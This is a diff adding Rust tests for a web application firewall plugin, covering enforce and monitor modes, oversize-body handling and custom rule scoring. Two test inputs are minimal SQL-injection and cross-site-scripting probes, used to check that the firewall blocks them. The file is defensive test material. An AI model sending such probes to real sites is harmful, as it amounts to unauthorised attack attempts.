+    ctx.set_raw_query_string("q=union+select+1".into());
+
+    let result = plugin.authorize(&mut ctx).await;
+    assert!(matches!(result, PluginResult::Continue));
+    assert!(!ctx.metadata.keys().any(|key| key.starts_with("waf.")));
+
+    let headers = ctx.headers.clone();
+    let result = plugin
+        .on_final_request_body_with_context(
+            &mut ctx,
+            &headers,
+            br#"{"c":"<script>alert(1)</script>"}"#,
+        )
+        .await;
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert!(!ctx.metadata.keys().any(|key| key.starts_with("waf.")));
+}
+
+#[tokio::test]
+async fn on_body_too_large_block_rejects_when_enforcing() {
+    // Fail closed: an oversize body that can't be fully scanned is rejected
+    // rather than passed through unscanned.
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "max_scan_bytes": 4,
+        "on_body_too_large": "block"
+    }))
+    .unwrap();
+    let mut ctx = ctx("POST", "/submit");
+    ctx.headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = ctx.headers.clone();
+
+    let result = plugin
+        .on_final_request_body_with_context(
+            &mut ctx,
+            &headers,
+            b"this body is far larger than four bytes",
+        )
+        .await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert_eq!(
+        ctx.metadata.get("waf.block_reason").map(String::as_str),
+        Some("body_too_large")
+    );
+    assert_eq!(
+        ctx.metadata.get("waf.body_too_large").map(String::as_str),
+        Some("true")
+    );
+}
+
+#[tokio::test]
+async fn on_body_too_large_block_in_monitor_mode_does_not_reject() {
+    let plugin = Waf::new(&json!({
+        "mode": "monitor",
+        "max_scan_bytes": 4,
+        "on_body_too_large": "block"
+    }))
+    .unwrap();
+    let mut ctx = ctx("POST", "/submit");
+    ctx.headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = ctx.headers.clone();
+
+    let result = plugin
+        .on_final_request_body_with_context(
+            &mut ctx,
+            &headers,
+            b"this body is far larger than four bytes",
+        )
+        .await;
+
+    assert!(matches!(result, PluginResult::Continue));
+    assert_eq!(
+        ctx.metadata.get("waf.body_too_large").map(String::as_str),
+        Some("true")
+    );
+}
+
+#[tokio::test]
+async fn per_rule_score_override_drives_blocking() {
+    // A low-severity rule with an explicit high score blocks on its own.
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "scoring": { "enabled": true, "block_threshold": 8 },
+        "include_default_rules": false,
+        "custom_rules": [{
+            "id": "CUSTOM-SCORE",
+            "name": "weighted marker",
+            "category": "custom",
+            "severity": "low",
+            "target": "query_values",
+            "match_kind": "contains",
+            "pattern": "needle",
+            "action": "monitor",
+            "score": 9
+        }]
+    }))
+    .unwrap();
+    let mut ctx = ctx("GET", "/search");
+    ctx.set_raw_query_string("q=needle".into());
+
+    let result = plugin.authorize(&mut ctx).await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert_eq!(ctx.metadata.get("waf.score").map(String::as_str), Some("9"));
+    assert_eq!(
+        ctx.metadata.get("waf.block_reason").map(String::as_str),
+        Some("score")
+    );
 }
